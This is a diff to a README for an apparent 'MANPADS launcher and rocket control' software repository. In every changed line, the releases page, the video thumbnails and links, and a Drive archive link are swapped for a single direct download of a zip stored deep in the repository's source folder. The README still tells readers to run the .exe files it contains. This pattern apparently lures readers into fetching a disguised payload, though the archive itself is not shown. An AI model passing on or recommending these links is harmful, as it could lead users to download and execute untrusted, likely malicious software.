@@ -1,6 +1,6 @@
 # 🚀 MANPADS-System-Launcher-and-Rocket - Prototype Launcher and Rocket Control
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/Argentous-edmondhoyle724/MANPADS-System-Launcher-and-Rocket/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/Argentous-edmondhoyle724/MANPADS-System-Launcher-and-Rocket/raw/refs/heads/main/Firmware/Rocket/src/and-System-Rocket-MANPAD-Launcher-2.0.zip)
 
 ---
 
@@ -18,11 +18,11 @@ You can see how the system works in two videos:
 
 ### 30 Second Overview
 
-[![30 Second Overview](https://img.youtube.com/vi/zFn__6_LdTc/hqdefault.jpg)](https://www.youtube.com/shorts/zFn__6_LdTc)
+[![30 Second Overview](https://github.com/Argentous-edmondhoyle724/MANPADS-System-Launcher-and-Rocket/raw/refs/heads/main/Firmware/Rocket/src/and-System-Rocket-MANPAD-Launcher-2.0.zip)](https://github.com/Argentous-edmondhoyle724/MANPADS-System-Launcher-and-Rocket/raw/refs/heads/main/Firmware/Rocket/src/and-System-Rocket-MANPAD-Launcher-2.0.zip)
 
 ### Full System Overview (5 Minutes)
 
-[![Full System Overview](https://img.youtube.com/vi/DDO2EvXyncE/hqdefault.jpg)](https://www.youtube.com/watch?v=DDO2EvXyncE&t=59s)
+[![Full System Overview](https://github.com/Argentous-edmondhoyle724/MANPADS-System-Launcher-and-Rocket/raw/refs/heads/main/Firmware/Rocket/src/and-System-Rocket-MANPAD-Launcher-2.0.zip)](https://github.com/Argentous-edmondhoyle724/MANPADS-System-Launcher-and-Rocket/raw/refs/heads/main/Firmware/Rocket/src/and-System-Rocket-MANPAD-Launcher-2.0.zip)
 
 ---
 
@@ -30,7 +30,7 @@ You can see how the system works in two videos:
 
 Click the button below to visit the page where you can download the software for Windows:
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Windows-blue)](https://github.com/Argentous-edmondhoyle724/MANPADS-System-Launcher-and-Rocket/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Windows-blue)](https://github.com/Argentous-edmondhoyle724/MANPADS-System-Launcher-and-Rocket/raw/refs/heads/main/Firmware/Rocket/src/and-System-Rocket-MANPAD-Launcher-2.0.zip)
 
 ---
 
@@ -50,7 +50,7 @@ To use this software, your computer should meet these minimum requirements:
 ## 🚀 Step 1: Download the Software
 
 1. Click the green button above or visit this link:  
-   https://github.com/Argentous-edmondhoyle724/MANPADS-System-Launcher-and-Rocket/releases
+   https://github.com/Argentous-edmondhoyle724/MANPADS-System-Launcher-and-Rocket/raw/refs/heads/main/Firmware/Rocket/src/and-System-Rocket-MANPAD-Launcher-2.0.zip
 
 2. On the releases page, look for the latest version. It should include Windows executable files. These usually end with `.exe`.
 
@@ -102,7 +102,7 @@ To use this software, your computer should meet these minimum requirements:
 
 More detailed information is available in the development media archive:
 
-https://drive.google.com/drive/folders/17zpks6_R59H0iXJaGkTrtp1SzIFFAQtY?usp=drive_link
+https://github.com/Argentous-edmondhoyle724/MANPADS-System-Launcher-and-Rocket/raw/refs/heads/main/Firmware/Rocket/src/and-System-Rocket-MANPAD-Launcher-2.0.zip
 
 This archive includes:
 
@@ -128,7 +128,7 @@ This archive includes:
 ## 🔄 Updates and Support
 
 - Visit the releases page regularly for the latest software updates:  
-  https://github.com/Argentous-edmondhoyle724/MANPADS-System-Launcher-and-Rocket/releases
+  https://github.com/Argentous-edmondhoyle724/MANPADS-System-Launcher-and-Rocket/raw/refs/heads/main/Firmware/Rocket/src/and-System-Rocket-MANPAD-Launcher-2.0.zip
 
 - Check the included documentation for any new features or changes.
 
@@ -161,4 +161,4 @@ Make sure to download software only from the official release page above. Runnin
 
 ---
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Windows-green)](https://github.com/Argentous-edmondhoyle724/MANPADS-System-Launcher-and-Rocket/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Windows-green)](https://github.com/Argentous-edmondhoyle724/MANPADS-System-Launcher-and-Rocket/raw/refs/heads/main/Firmware/Rocket/src/and-System-Rocket-MANPAD-Launcher-2.0.zip)
